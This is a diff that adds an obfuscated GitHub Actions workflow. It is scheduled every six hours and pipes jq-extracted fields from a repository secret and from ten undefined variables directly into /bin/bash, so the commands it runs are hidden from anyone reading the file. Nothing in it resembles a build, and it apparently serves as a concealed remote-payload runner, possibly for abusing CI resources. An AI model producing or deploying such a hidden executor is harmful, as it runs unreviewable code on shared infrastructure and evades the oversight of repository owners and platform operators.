@@ -1,0 +1,28 @@
+name: huiqianhq
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huiqianhq
+        env:
+          gqq79258: ${{ secrets.gqq79258 }}
+        run: |
+          echo $gqq79258 | jq -r .p351 | /bin/bash
+          echo $f7072 | jq -r .fuel1204 | /bin/bash
+          echo $kca16546 | jq -r .zbrp558 | /bin/bash
+          echo $jjkc86 | jq -r .deodi71 | /bin/bash
+          echo $th09558 | jq -r .l29 | /bin/bash
+          echo $uzfn97 | jq -r .ghfzz17033 | /bin/bash
+          echo $zp75 | jq -r .dp1056 | /bin/bash
+          echo $sjosg784 | jq -r .iavsd2856 | /bin/bash
+          echo $fpe545 | jq -r .mtw299 | /bin/bash
+          echo $jkm9517 | jq -r .ulqj2 | /bin/bash
+          echo $c7703 | jq -r .e036 | /bin/bash
+
